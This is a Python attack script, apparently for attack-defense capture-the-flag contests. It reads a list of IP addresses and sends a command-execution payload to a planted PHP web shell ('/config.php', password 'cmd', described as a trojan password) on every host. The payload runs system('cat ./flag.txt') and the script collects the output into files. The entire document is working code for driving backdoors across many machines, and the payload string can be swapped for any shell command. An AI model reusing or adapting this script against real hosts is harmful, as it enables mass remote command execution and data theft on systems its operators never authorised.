#coding=utf-8
import requests
import re
import time
import os
shell_addr="/config.php"
passwd="cmd"                    #木马密码
port="81"
payload =  {passwd: 'system(\'cat ./flag.txt\');'}

ippath="config_php_passwd_cmd.txt"
pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
iptables = ""
with open(ippath, 'r') as file_to_read:
    while True:
        lines = file_to_read.readline() 
        if not lines:
            break
            pass
        iptables+=lines  
#print(iptables)
iplist=pattern.findall(iptables)

time_str=time.strftime("%Y-%m-%d-%H-%M-%S", time.localtime())
if os.path.exists("./flag/"):
    flag=open("./flag/"+time_str+"-flag.txt","a")
else:
    os.mkdir("./flag/")
    flag=open("./flag/"+time_str+"-flag.txt","a")

for ip in iplist:
    url="http://"+ip+":"+port+shell_addr
    try:
        res=requests.post(url,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            result = url+" connect shell sucess,flag is "+res.text
            print(result)
            flag.write(url+"\t"+res.text+"\n")
        else:
            print ("shell 404")
    except:
        print(url+" connect shell fail")

flag.close()